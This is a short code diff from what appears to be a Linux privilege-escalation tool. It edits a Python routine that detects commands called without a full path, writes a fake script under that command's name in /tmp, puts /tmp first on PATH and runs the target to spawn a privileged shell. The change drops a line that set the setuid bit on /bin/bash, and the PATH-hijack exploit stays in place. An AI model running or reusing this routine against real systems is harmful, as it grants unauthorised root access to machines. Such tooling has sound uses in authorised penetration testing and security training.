@@ -486,7 +486,7 @@ def path():
             non_path_cmd = re.search("\s{}\s".format(cmd), f)
             if non_path_cmd:
                os.system("echo '### {} does not specify full path of *{}* command... run 'whoami' to confirm root privileges ###' | tee -a /tmp/path_res.txt".format(path,cmd))
-               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo 'sudo chmod +xs /bin/bash' >> /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod 777 /tmp/{}".format(cmd,cmd,cmd,cmd,cmd))
+               os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod 777 /tmp/{}".format(cmd,cmd,cmd,cmd))
                os.system("export PATH=/tmp:$PATH")
                os.system(".{}".format(path))
                os.system("{}".format(path))
